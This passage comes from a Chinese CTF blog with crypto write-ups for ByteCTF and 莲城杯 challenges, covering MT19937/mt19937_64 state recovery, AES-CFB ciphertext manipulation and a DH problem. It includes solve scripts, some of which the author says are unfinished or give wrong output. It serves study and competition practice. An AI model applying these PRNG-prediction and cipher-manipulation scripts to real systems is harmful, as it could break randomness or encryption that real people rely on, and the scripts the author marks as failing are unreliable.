ByteCTF&#123;5831a241s-f30980</span></span><br><span class="line">keys = key</span><br></pre></td></tr></table></figure>

<p>并且获得前半部分的flag</p>
<p>下一步就是用CBC模式，CBC模式我们可以爆破IV，上亿的数据慢是慢了点，但是可以出</p>
<p>完整的exp，思路应该没错，但是不知道哪里有问题，尚师傅出来了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shift</span>(<span class="params">m, k, c</span>):</span></span><br><span class="line">    <span class="keyword">if</span> k &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> m ^ m &gt;&gt; (-k) &amp; c</span><br><span class="line">    <span class="keyword">return</span> m ^ m &lt;&lt; k &amp; c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span>(<span class="params">m, key</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    roll back</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    c_list = [<span class="number">0x37386180af9ae39e</span>, <span class="number">0xaf754e29895ee11a</span>, <span class="number">0x85e1a429a2b7030c</span>, <span class="number">0x964c5a89f6d3ae8c</span>]</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        m = shift(m, key[t], c_list[t])</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cipher = <span class="string">&#x27;89b8aca257ee2748f030e7f6599cbe0cbb5db25db6d3990d3b752eda9689e30fa2b03ee748e0da3c989da2bba657b912&#x27;</span></span><br><span class="line">length = <span class="built_in">len</span>(cipher)</span><br><span class="line"></span><br><span class="line"><span class="comment"># front</span></span><br><span class="line"><span class="comment"># get key</span></span><br><span class="line">cipher1 = cipher[:length // <span class="number">2</span>]</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(cipher1) % <span class="number">16</span> == <span class="number">0</span></span><br><span class="line">c1 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher1) // <span class="number">16</span>):</span><br><span class="line">    c1.append(<span class="built_in">int</span>(cipher1[i * <span class="number">16</span>: (i + <span class="number">1</span>) * <span class="number">16</span>], <span class="number">16</span>))</span><br><span class="line">plaintext1_block1 = bytes_to_long(<span class="string">b&#x27;ByteCTF&#123;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cipher1_block1 = c1[<span class="number">0</span>]</span><br><span class="line">cipher1_block2 = c1[<span class="number">1</span>]</span><br><span class="line">cipher1_block3 = c1[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">iv_keys_block1 = plaintext1_block1 ^ cipher1_block1</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">space = [int(_) for _ in range(-32, 33)]</span></span><br><span class="line"><span class="string">key = []</span></span><br><span class="line"><span class="string">plaintext1 = &#x27;&#x27;</span></span><br><span class="line"><span class="string">for keys in product(space, repeat=4):</span></span><br><span class="line"><span class="string">    iv_keys_block2 = convert(iv_keys_block1, keys)</span></span><br><span class="line"><span class="string">    iv_keys_block3 = convert(iv_keys_block2, keys)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    fake_plaintext_block2 = long_to_bytes(cipher1_block2 ^ iv_keys_block2)</span></span><br><span class="line"><span class="string">    fake_plaintext_block3 = long_to_bytes(cipher1_block3 ^ iv_keys_block3)</span></span><br><span class="line"><span class="string">    plaintext1 = b&#x27;ByteCTF&#123;&#x27; + fake_plaintext_block2 + fake_plaintext_block3</span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        if plaintext1.decode().isascii() and plaintext1.decode().isprintable():</span></span><br><span class="line"><span class="string">            print(&#x27;you complete first task: get keys &amp;&amp; half flag\nnow please wait for a minute, &#x27;</span></span><br><span class="line"><span class="string">                  &#x27;it takes a long time&#x27;)</span></span><br><span class="line"><span class="string">            print(&#x27;this is your flag, keep going&#x27;)</span></span><br><span class="line"><span class="string">            print(plaintext1)</span></span><br><span class="line"><span class="string">            key = keys</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">    except:</span></span><br><span class="line"><span class="string">        pass&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># ByteCTF&#123;5831a241s-f30980</span></span><br><span class="line">keys = [-<span class="number">12</span>, <span class="number">26</span>, -<span class="number">3</span>, -<span class="number">31</span>]</span><br><span class="line"><span class="comment"># keys = key</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get first iv ^ keys | see below</span></span><br><span class="line">iv_keys = <span class="number">0</span></span><br><span class="line"><span class="comment"># for i in tqdm(range(148298916 * 2 - 1)):</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_me_time</span>(<span class="params">key_list</span>):</span></span><br><span class="line">    _plaintext = bytes_to_long(<span class="string">b&#x27;$&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">    _cipher = _plaintext</span><br><span class="line">    _i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        _cipher = convert(_cipher, key_list)</span><br><span class="line">        _i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> _cipher == _plaintext:</span><br><span class="line">            <span class="keyword">return</span> _i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get times</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;now you must get times&#x27;</span>)</span><br><span class="line">times = show_me_time(keys)</span><br><span class="line"><span class="comment"># times = 148298916</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;congratulations. you did it, this is your times&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(times)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hang on, there is still a long long way to go\nhowever i set a progress bar to play with you&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># back</span></span><br><span class="line">cipher2 = cipher[:length // <span class="number">2</span>]</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(cipher2) % <span class="number">16</span> == <span class="number">0</span></span><br><span class="line">c2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher2) // <span class="number">16</span>):</span><br><span class="line">    c2.append(<span class="built_in">int</span>(cipher2[i * <span class="number">16</span>: (i + <span class="number">1</span>) * <span class="number">16</span>], <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">cipher2_block1 = c2[<span class="number">0</span>]</span><br><span class="line">cipher2_block2 = c2[<span class="number">1</span>]</span><br><span class="line">cipher2_block3 = c2[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># remember sub 1 for already roll back</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(times * <span class="number">2</span> - <span class="number">1</span>)):</span><br><span class="line">    iv_keys_block1 = convert(iv_keys_block1, keys)</span><br><span class="line">    cipher2_block3 = convert(cipher2_block3, keys)</span><br><span class="line">    cipher2_block2 = convert(cipher2_block2, keys)</span><br><span class="line">    cipher2_block1 = convert(cipher2_block1, keys)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;you complete second task: get IV&#x27;</span>)</span><br><span class="line">IV = iv_keys_block1</span><br><span class="line"><span class="built_in">print</span>(IV)</span><br><span class="line">plaintext2 = <span class="built_in">list</span>(<span class="built_in">map</span>(long_to_bytes, [x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>([IV, c2[<span class="number">0</span>], c2[<span class="number">1</span>]],</span><br><span class="line">                                                            [cipher2_block1, cipher2_block2, cipher2_block3])]))</span><br><span class="line">plaintext2 = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">str</span>, plaintext2))</span><br><span class="line">plaintext2 = <span class="string">&quot;&quot;</span>.join(plaintext2)</span><br><span class="line"><span class="built_in">print</span>(plaintext2)</span><br><span class="line"><span class="built_in">print</span>(cipher2_block3, cipher2_block2, cipher2_block1)</span><br></pre></td></tr></table></figure>

<p>8G的电脑40分钟左右，16G的20分钟</p>
<p>但出来不太对，IV是对的，和尚师傅对过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">now you must get times</span><br><span class="line">congratulations. you did it, this <span class="keyword">is</span> your times</span><br><span class="line"><span class="number">148298916</span></span><br><span class="line">hang on, there <span class="keyword">is</span> still a long long way to go</span><br><span class="line">however i <span class="built_in">set</span> a progress bar to play <span class="keyword">with</span> you</span><br><span class="line"><span class="number">100</span>%|██████████| <span class="number">296597831</span>/<span class="number">296597831</span> [<span class="number">43</span>:<span class="number">51</span>&lt;<span class="number">00</span>:<span class="number">00</span>, <span class="number">112731.15</span>it/s]</span><br><span class="line">you complete second task: get IV</span><br><span class="line"><span class="number">16476971533267772345</span></span><br><span class="line"><span class="string">b&#x27;E\x0c:\xc5c0\xcc\xf3&#x27;</span><span class="string">b&#x27;ue\x0e\xf4I\x06\xf7D&#x27;</span><span class="string">b&#x27;\xef\xad\xb2\n\x16\\\xe0\x8d&#x27;</span></span><br><span class="line"><span class="number">2278071528677465729</span> <span class="number">18220898158180356108</span> <span class="number">11647940908327300938</span></span><br></pre></td></tr></table></figure>

<p>emmmmm累了</p>
<p>回到最开始的convert函数，其实就是MT19937的内部实现，用MT19937的逆算法也可以</p>
<p><a href="https://www.xctf.org.cn/library/details/17e9b70557d94b168c3e5d1e7d4ce78f475de26d/">https://www.xctf.org.cn/library/details/17e9b70557d94b168c3e5d1e7d4ce78f475de26d/</a></p>
<p>有空试试</p>
<h2 id="JustDecrypt（unsolved）"><a href="#JustDecrypt（unsolved）" class="headerlink" title="JustDecrypt（unsolved）"></a>JustDecrypt（unsolved）</h2><p>我觉得这道题考两个点吧，一点是CFB，类似重排攻击？看V神的博客比较好懂</p>
<p><a href="https://jayxv.github.io/2020/03/03/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E6%93%8D%E4%BD%9C%E6%A8%A1%E5%BC%8F/">V神博客</a></p>
<p>关于CFB的流程图，网上我觉得还是这张图最好懂</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211019181046534.png" alt="image-20211019181046534"></p>
<p>但是失败了，暂不清楚原因；一开始以为是pad有问题，不能正常填充和去填充</p>
<p>本来想用这个来绕过pad</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">BLOCK_SIZE = <span class="number">16</span></span><br><span class="line">plaintext = <span class="string">b&quot;Hello, I&#x27;m a Bytedancer. Please give me the flag!&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(plaintext))</span><br><span class="line">m_list = []</span><br><span class="line"><span class="comment"># pad</span></span><br><span class="line">m_list.append(plaintext[:<span class="number">15</span>].ljust(<span class="number">16</span>, <span class="string">b&#x27;\x01&#x27;</span>))</span><br><span class="line">m_list.append(plaintext[<span class="number">15</span>:<span class="number">30</span>].ljust(<span class="number">16</span>, <span class="string">b&#x27;\x01&#x27;</span>))</span><br><span class="line">m_list.append(plaintext[<span class="number">30</span>:<span class="number">45</span>].ljust(<span class="number">16</span>, <span class="string">b&#x27;\x01&#x27;</span>))</span><br><span class="line">m_list.append(plaintext[<span class="number">45</span>:].ljust(<span class="number">16</span>, <span class="string">b&#x27;\x03&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>没什么用</p>
<p>本地写了个服务（去掉验证和pad、unpad），暂时的exp，求出第一个明文对应的密文，送过去解密不对</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters, digits</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">space = ascii_letters + digits</span><br><span class="line">BLOCK_SIZE = <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = remote(&#x27;39.105.181.182&#x27;, 30001)</span></span><br><span class="line">sh = process([<span class="string">&quot;python3&quot;</span>, <span class="string">&quot;JustDecrypt.py&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AES_CFB</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.key = urandom(BLOCK_SIZE)</span><br><span class="line">        self.iv = urandom(<span class="number">16</span>)</span><br><span class="line">        self.aes_encrypt = AES.new(self.key, AES.MODE_CFB, self.iv)</span><br><span class="line">        self.aes_decrypt = AES.new(self.key, AES.MODE_CFB, self.iv)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self, plain</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.aes_encrypt.encrypt(self.pad(plain))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">self, cipher</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.unpad(self.aes_decrypt.decrypt(cipher))</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">s</span>):</span></span><br><span class="line">        num = BLOCK_SIZE - (<span class="built_in">len</span>(s) % BLOCK_SIZE)</span><br><span class="line">        <span class="keyword">return</span> s + <span class="built_in">bytes</span>([num] * num)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">unpad</span>(<span class="params">s</span>):</span></span><br><span class="line">        <span class="keyword">return</span> s[:-s[-<span class="number">1</span>]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plaintext = <span class="string">b&quot;Hello, I&#x27;m a Bytedancer. Please give me the flag!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get ek(IV)</span></span><br><span class="line">payload_ct = urandom(<span class="number">16</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Please enter your cipher in hex &gt; &#x27;</span>)</span><br><span class="line">sh.sendline(payload_ct.<span class="built_in">hex</span>())</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Your plaintext in hex: \n&#x27;</span>)</span><br><span class="line">m_block1 = <span class="built_in">bytes</span>.fromhex(sh.recvline()[:-<span class="number">1</span>].decode())</span><br><span class="line">ek_iv = xor(m_block1, payload_ct)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get c1</span></span><br><span class="line">c1 = xor(payload_ct, ek_iv)</span><br><span class="line"><span class="built_in">print</span>(c1.<span class="built_in">hex</span>())</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get flag</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;sh.recvuntil(b&#x27;Please enter your cipher in hex &gt;&#x27;)</span></span><br><span class="line"><span class="string">sh.sendline((c1 + c1 + c3 + c4).hex())</span></span><br><span class="line"><span class="string">sh.recvuntil(b&#x27;Your plaintext in hex: \n&#x27;)</span></span><br><span class="line"><span class="string">sh.recv()&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="Overheard（unsolved）"><a href="#Overheard（unsolved）" class="headerlink" title="Overheard（unsolved）"></a>Overheard（unsolved）</h2><p>代码短看得很快，用到的是DH密钥交换协议，背景知识可以看</p>
<p><a href="https://4xwi11.github.io/posts/898249b7/#DH%E5%8D%8F%E8%AE%AE">https://4xwi11.github.io/posts/898249b7/#DH%E5%8D%8F%E8%AE%AE</a></p>
<p>除了私钥$a$和$b$，其他我们都知道；还可以给Bob发消息，Bob用私钥$b$加密后，将低64位隐去返回；想让我们求出<br>$$<br>g^{ab}\ mod\ p<br>$$<br>显然，如果我们发送$g^a$，那么得到的就是$g^{ab}$的高位</p>
<p>然后没想到了</p>
<hr>
<p>看着WM师傅的WP复现</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>MT19937</tag>
        <tag>AES CFB</tag>
        <tag>AES OFB</tag>
        <tag>DH协议</tag>
      </tags>
  </entry>
  <entry>
    <title>20211011 莲城杯Crypto方向WP</title>
    <url>/posts/4251790a/</url>
    <content><![CDATA[<p>（emmmmm最近态度不是很好，看不清某些东西，有点爆粗口多有得罪，对事不对人，对人也无所谓）</p>
<p>有被恶心到说实话，一上来Crypto都没有，艹</p>
<p>web靶机还是静态的</p>
<p>全场下来也就两道密码。第二题上来开始感觉还行，卡了挺久，但后面被发现是原题，直接emmmmm，也还好吧。C++下的MT19937和python的不一样</p>
<span id="more"></span>

<h1 id="莲城杯"><a href="#莲城杯" class="headerlink" title="莲城杯"></a>莲城杯</h1><h2 id="randomCrypto"><a href="#randomCrypto" class="headerlink" title="randomCrypto"></a>randomCrypto</h2><p>没什么好讲的</p>
<h2 id="Yusa的密码学课堂——MT19937"><a href="#Yusa的密码学课堂——MT19937" class="headerlink" title="Yusa的密码学课堂——MT19937"></a>Yusa的密码学课堂——MT19937</h2><p>又是这个系列的题</p>
<p>有三个文件都已经上传至<a href="https://github.com/4XWi11/CTF-sourcecode.git">github仓库</a>里了</p>
<p>虽然考点还是MT19937伪随机数，但是这个是在C++下写的；之前发过关于这类题的文章，但今天去看写地太烂了，处刑一下，完全没有搞懂嘛</p>
<p><a href="https://4xwi11.github.io/posts/2d82e8aa/">https://4xwi11.github.io/posts/2d82e8aa/</a></p>
<p>解决上次的一个问题</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211011203341752.png" alt="image-20211011203341752"></p>
<p>并非不是需要624个数，而是需要凑足<code>32*624</code>位，也就是<code>64*312</code>位</p>
<p>所以如果是纯python的话，这道题应该秒出，但问题是C++；试了下就算给相同的种子，但生成的随机数序列也是不同的，算法略有出路应该</p>
<p>代码不长，贴一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">subprocess.run([<span class="string">&quot;g++&quot;</span>, <span class="string">&quot;random.cpp&quot;</span>, <span class="string">&quot;-o&quot;</span>, <span class="string">&quot;random&quot;</span>, <span class="string">&quot;-std=c++11&quot;</span>],check=<span class="literal">True</span>)</span><br><span class="line">proc = subprocess.Popen([<span class="string">&quot;./random&quot;</span>],stdin=subprocess.PIPE,stdout=subprocess.PIPE)</span><br><span class="line"></span><br><span class="line"><span class="comment"># out, err = proc.communicate(str(int(os.urandom(8).hex(),16)).encode() + b&quot;\n&quot;)</span></span><br><span class="line">out, err = proc.communicate(<span class="built_in">str</span>(<span class="number">16063322316592949072</span>).encode() + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">data = out.strip().split()</span><br><span class="line">flag = random.randint(<span class="number">0</span>,<span class="built_in">len</span>(data))</span><br><span class="line">FLAG = <span class="string">b&#x27;DASCTF&#123;&#x27;</span>+hashlib.md5(data.pop(flag)).hexdigest().encode()+<span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">data = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;outputs_%d.txt&quot;</span>%flag,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">str</span>(data))</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cinttypes&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;random&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> seed;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; seed;</span><br><span class="line">  <span class="function"><span class="built_in">std</span>::mt19937_64 <span class="title">rng</span><span class="params">(seed)</span></span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; ++i) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; rng() &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>好了，开始讲这道题的思路</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211011211321791.png" alt="image-20211011211321791"></p>
<p>这张图出来的有点早（doge）</p>
<p>先看到最后，这个flag在文件名中，就是pop出来的伪随机数，是<code>374</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;outputs_%d.txt&quot;</span>%flag,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">str</span>(data))</span><br></pre></td></tr></table></figure>

<p>但可惜根据pop，虽然我们知道data，但是是删除了原第<code>374</code>位的data</p>
<p>需要通过其余<code>373</code>+<code>625</code>个数字求得这位</p>
<p>显然根据之前的<code>mt19937predictor</code>，和前<code>373</code>位（这个上面刚解释过）以及后面的<code>625</code>位，是完全可以获得的，然后再得到第<code>374</code>个，拿捏</p>
<p>可是试过了不行，用了恢复的方法也不行；然后就想是不是C++的问题</p>
<p>所以接下来的搜索思路就如上图所示，搜索关键词<code>c++</code>和<code>mt19937</code>以及<code>predict</code>，当然一般都返回<code>32</code>位的结果，所以加上<code>64</code>；原题到手</p>
<p>改下jo本就有</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> mt19937_64 <span class="keyword">import</span> mt19937_64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">res = [<span class="number">15224110489171130169</span>, <span class="number">1487925206988459477</span>, <span class="number">13480727356180709371</span>, <span class="number">9868256411224235526</span>, <span class="number">6217804851957837168</span>, <span class="number">16087170136679200450</span>, <span class="number">10701512125563075829</span>, <span class="number">13839719157982856576</span>, <span class="number">17686330611486610733</span>, <span class="number">8009416170371519873</span>, <span class="number">5970669226517080452</span>, <span class="number">11269217943220347675</span>, <span class="number">10679128876184101302</span>, <span class="number">18426494309927575430</span>, <span class="number">2766502893811979226</span>, <span class="number">2252796059596895410</span>, <span class="number">9426444128738501522</span>, <span class="number">11240845202238046967</span>, <span class="number">10773508588111955623</span>, <span class="number">1557877671900503598</span>, <span class="number">10687052904024584487</span>, <span class="number">1329391365184628727</span>, <span class="number">7924797549450027243</span>, <span class="number">8535390433774276870</span>, <span class="number">3764662861183967374</span>, <span class="number">2246153524896469598</span>, <span class="number">2609915142724872757</span>, <span class="number">10658867097171399935</span>, <span class="number">5527882090828515536</span>, <span class="number">16980061916688614551</span>, <span class="number">369781677154768879</span>, <span class="number">16440083865102214341</span>, <span class="number">6215352314823709568</span>, <span class="number">7140216739817729337</span>, <span class="number">12081906179615786779</span>, <span class="number">6478685619216942062</span>, <span class="number">9619055260791569210</span>, <span class="number">1716773987678792695</span>, <span class="number">5781591055396867866</span>, <span class="number">10236249441362668669</span>, <span class="number">4314491602044042424</span>, <span class="number">9076763991771914801</span>, <span class="number">1019089589927696539</span>, <span class="number">12783145303781447438</span>, <span class="number">1784730974216681496</span>, <span class="number">10724359773647505800</span>, <span class="number">9412346711065789784</span>, <span class="number">12397469196070741661</span>, <span class="number">844871001521064632</span>, <span class="number">13554026965219580112</span>, <span class="number">4176961812003667679</span>, <span class="number">6038315983316303141</span>, <span class="number">3991176913179867636</span>, <span class="number">7277063843827680934</span>, <span class="number">6593392965255927508</span>, <span class="number">7279379575539700793</span>, <span class="number">7049180319367268844</span>, <span class="number">2484858153711481256</span>, <span class="number">9662542622219218463</span>, <span class="number">15645318283754749515</span>, <span class="number">7848634356524747132</span>, <span class="number">6328770785215004957</span>, <span class="number">14031726511284712999</span>, <span class="number">10754197358715401067</span>, <span class="number">14877197602427408826</span>, <span class="number">1961981170873480756</span>, <span class="number">15043831614315156076</span>, <span class="number">2703733192099380300</span>, <span class="number">5573267746680488476</span>, <span class="number">2588678833804270160</span>, <span class="number">16641900531805836732</span>, <span class="number">14485077651674686804</span>, <span class="number">17908682116840210486</span>, <span class="number">12129346423391778925</span>, <span class="number">449323128784312129</span>, <span class="number">2912052724053440605</span>, <span class="number">3725415122737515057</span>, <span class="number">12106075465626310804</span>, <span class="number">7844624661111246261</span>, <span class="number">4336975117722586651</span>, <span class="number">6133486737560458810</span>, <span class="number">4285708852412482387</span>, <span class="number">17320873594107961221</span>, <span class="number">18154223303204659281</span>, <span class="number">9782280317517313987</span>, <span class="number">7359883602982876716</span>, <span class="number">8302270318241074541</span>, <span class="number">2854871868457850608</span>, <span class="number">4260073478828444220</span>, <span class="number">12464166743488435720</span>, <span class="number">11545300218414290638</span>, <span class="number">15943917616147672791</span>, <span class="number">17684529969128042573</span>, <span class="number">11970487736986863722</span>, <span class="number">4279463896104155311</span>, <span class="number">6452386490939306659</span>, <span class="number">14951002814044492267</span>, <span class="number">3924373366113113482</span>, <span class="number">17675004214657643053</span>, <span class="number">10514060213491578166</span>, <span class="number">5083735479763236962</span>, <span class="number">8237048074291002693</span>, <span class="number">178024658423258428</span>, <span class="number">16217384550361068797</span>, <span class="number">6823885072554733775</span>, <span class="number">14640293890442769000</span>, <span class="number">11118102735797335929</span>, <span class="number">17687811899187265346</span>, <span class="number">12324758265458544032</span>, <span class="number">13305186849598403772</span>, <span class="number">2061361200506122451</span>, <span class="number">4473679754720240444</span>, <span class="number">15364566282531130774</span>, <span class="number">10360818283823976655</span>, <span class="number">17220043518084908852</span>, <span class="number">9386042935320331823</span>, <span class="number">10932555460714805145</span>, <span class="number">14286030551222176204</span>, <span class="number">5513294049464657489</span>, <span class="number">9643782458509542843</span>, <span class="number">2950842616838528179</span>, <span class="number">16153550634060410597</span>, <span class="number">10622243240110203305</span>, <span class="number">1642938210383117587</span>, <span class="number">16348894212565750617</span>, <span class="number">17802404752703029833</span>, <span class="number">16933001622790235864</span>, <span class="number">13021337058260052257</span>, <span class="number">17301160463217879931</span>, <span class="number">4914154622730751038</span>, <span class="number">3649150598994385675</span>, <span class="number">17138640742876844054</span>, <span class="number">6723182378145435688</span>, <span class="number">15799828338293133322</span>, <span class="number">994720218982390675</span>, <span class="number">10557290726979603665</span>, <span class="number">17714019041621996643</span>, <span class="number">13997848863450584994</span>, <span class="number">11077445104717373075</span>, <span class="number">2834856239311065051</span>, <span class="number">11214787995926447582</span>, <span class="number">4068838695613829268</span>, <span class="number">3318186966385494373</span>, <span class="number">10984597623033520694</span>, <span class="number">5515414919887778777</span>, <span class="number">7222755179917827587</span>, <span class="number">16315875605087375576</span>, <span class="number">1416504086864662519</span>, <span class="number">9102186857132686420</span>, <span class="number">10069600536464217172</span>, <span class="number">6582524821522410340</span>, <span class="number">15369756932292150641</span>, <span class="number">17542632941176957329</span>, <span class="number">6114252881995050176</span>, <span class="number">2055179652476914195</span>, <span class="number">16405356136326356060</span>, <span class="number">14344232008993353644</span>, <span class="number">7357227068527869292</span>, <span class="number">14444189009256502503</span>, <span class="number">474793712655159763</span>, <span class="number">7277957134452370555</span>, <span class="number">10136894698074936516</span>, <span class="number">16493593438906441399</span>, <span class="number">965972604086413481</span>, <span class="number">7698637742708237198</span>, <span class="number">14701582675687476239</span>, <span class="number">8687372870093533304</span>, <span class="number">8617910444450923438</span>, <span class="number">9198266698377902297</span>, <span class="number">17663341461584809487</span>, <span class="number">9416311128064169723</span>, <span class="number">15527623086766043739</span>, <span 